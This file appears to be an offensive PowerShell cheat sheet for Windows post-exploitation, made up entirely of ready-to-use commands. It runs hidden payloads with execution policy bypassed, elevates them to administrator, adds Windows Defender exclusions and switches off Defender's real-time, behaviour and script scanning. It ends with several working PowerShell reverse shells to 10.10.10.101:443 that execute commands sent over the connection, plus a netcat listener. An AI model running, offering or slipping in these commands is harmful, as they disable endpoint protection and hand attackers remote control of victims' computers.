# Locate Windows Startup Directory
[System.Environment]::GetFolderPath(7)

# Exec PS1 File
cmd /c start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Users\u101\payload.ps1"

# Exec PS1 File as Administrator
powershell.exe "Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File C:\Users\u101\payload.ps1' -Verb RunAs"

# Zip and Unzip
powershell Compress-Archive C:\Users\u101\file1 C:\Users\u101\file1.zip
powershell expand-archive C:\Users\u101\file1.zip C:\Users\u101\file1

# Add and Remove Windows Defender Exclusion File | Folder | Process
cmd /c start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "powershell.exe Add-MpPreference -ExclusionProcess '.exe'"
cmd /c start /min "" powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\ProgramData\Payload"

//Add Exclusion
Add-MpPreference -ExclusionExtension '.exe' -ErrorAction Ignore;
Add-MpPreference -ExclusionPath 'C:\ProgramData' -ErrorAction Ignore;
Add-MpPreference -ExclusionProcess 'calc.exe' -ErrorAction Ignore;

//Remove Exclusion
Remove-MpPreference -ExclusionExtension '.exe' -ErrorAction Ignore;
Remove-MpPreference -ExclusionPath 'C:\ProgramData' -ErrorAction Ignore;
Remove-MpPreference -ExclusionProcess 'calc.exe' -ErrorAction Ignore;

# Disable WinDF
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Ignore;Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction Ignore;Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction Ignore;Set-MpPreference -DisableIOAVProtection $true -ErrorAction Ignore;Set-MpPreference -DisablePrivacyMode $true -ErrorAction Ignore;Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction Ignore;Set-MpPreference -DisableArchiveScanning $true -ErrorAction Ignore;Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction Ignore;Set-MpPreference -DisableScriptScanning $true -ErrorAction Ignore;Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction Ignore;Set-MpPreference -MAPSReporting 0 -ErrorAction Ignore;Set-MpPreference -HighThreatDefaultAction 6 -Force -ErrorAction Ignore;Set-MpPreference -ModerateThreatDefaultAction 6 -ErrorAction Ignore;Set-MpPreference -LowThreatDefaultAction 6 -ErrorAction Ignore;Set-MpPreference -SevereThreatDefaultAction 6 -ErrorAction Ignor;

# Reverse Shell [Client || Server]
//Client:Run as PS1 file
//save this to client.ps1 file and type "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File payload.ps1"
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.101',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

//Client:Run direct CMD
//past this to command prompt
powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.101',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

//this work for windows H2
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.101',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

//Server:Run
nc -lnvp 443